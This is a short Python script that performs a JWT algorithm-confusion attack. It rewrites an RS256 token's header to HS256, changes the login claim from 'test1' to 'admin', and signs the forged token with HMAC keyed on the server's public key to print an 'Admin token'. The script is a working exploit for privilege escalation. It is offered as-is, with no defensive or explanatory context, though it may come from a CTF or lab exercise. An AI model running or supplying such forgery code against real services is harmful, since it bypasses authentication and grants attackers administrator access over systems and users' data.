import jwt, base64, hmac, hashlib

token ="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QxIn0.jqhwaFcwUvBRctnuv2ydLAwcGslUZwpAeeCQWTI1yyuEZpFcXfVYGwXhLuK_0i6NM1fBJYcnOimjDBbQftcD2BwaLJX9K8xhjE5vhMXX-DkPEpOnC5Ereguh7Se5X06aYnVCVf6ZtqsZbX8ZbfyTgmM06Jgd8tS5QUVHpS3qds8OzXuqMBuyZSOiWtaUi8odH2uvarkxN1BTc1-wMa8ePk6pNxpWMZwgLlVGM875H3ZvAkm1sd4yVmc-Sw05EOXQjjCYODsEhgG04Dz29MLBZQoZmJp8cJ75K8ZeS0Cs47NFOjX2fItNpryM0XnaqgfdM8HbE7GLe-vr8d-HREOmCg"

header, payload, sig = token.split('.')

## header changing HS256 from RS256 to using pubic key
print("change header To HS256")
dec_header = base64.urlsafe_b64decode(header + '=' *(len(header) % 4))
mod_header = dec_header.replace(b'RS256',b'HS256')
mod_header_64 = base64.urlsafe_b64encode(mod_header).rstrip(b'=').decode()
print(mod_header_64)

## GEnerate admin account payload
dec_payload = base64.urlsafe_b64decode(payload + '=' *(len(payload) % 4))
print (dec_payload)
print("Changing payload")
mod_payload = dec_payload.replace(b'test1', b'admin')
mod_payload_64 = base64.urlsafe_b64encode(mod_payload).rstrip(b'=').decode()
print(f"{mod_payload_64}")
print()
finally_payload = jwt.decode(token, options={"verify_signature":False})
print(finally_payload)

##base64 public key
f = open('public.pem')
public_key = f.read()

new_token = (mod_header_64 + "." + mod_payload_64)
sig = base64.urlsafe_b64encode(hmac.new(bytes(public_key, "UTF-8"), new_token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

re_token = f"{mod_header_64}.{mod_payload_64}.{sig}"
print(f"Admin token ::: {re_token}")


